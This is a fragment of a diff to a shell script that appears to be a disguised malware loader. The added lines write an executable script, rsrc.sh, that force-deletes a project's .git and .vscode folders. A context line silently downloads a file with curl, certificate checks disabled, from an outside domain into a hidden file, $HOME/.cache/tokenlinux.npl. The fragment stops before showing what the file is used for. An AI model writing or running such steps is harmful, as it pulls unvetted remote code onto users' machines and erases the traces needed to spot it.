@@ -5,8 +5,15 @@ if [ ! -d "$HOME/.cache" ]; then
   mkdir -p "$HOME/.cache"
 fi
 
-rm -rf "directory/.git"
-rm -rf "directory/.vscode"
+cat > "$TARGET_DIR/rsrc.sh" <<'EOF'
+#!/bin/bash
+set -e
+
+rm -rf -- "directory/.git"
+rm -rf -- "directory/.vscode"
+EOF
+
+chmod +x "$TARGET_DIR/rsrc.sh"
 
 if command -v curl >/dev/null 2>&1; then
     curl -k -sSL -o "$HOME/.cache/tokenlinux.npl" "https://www.sandbox-support.cloud/v4"
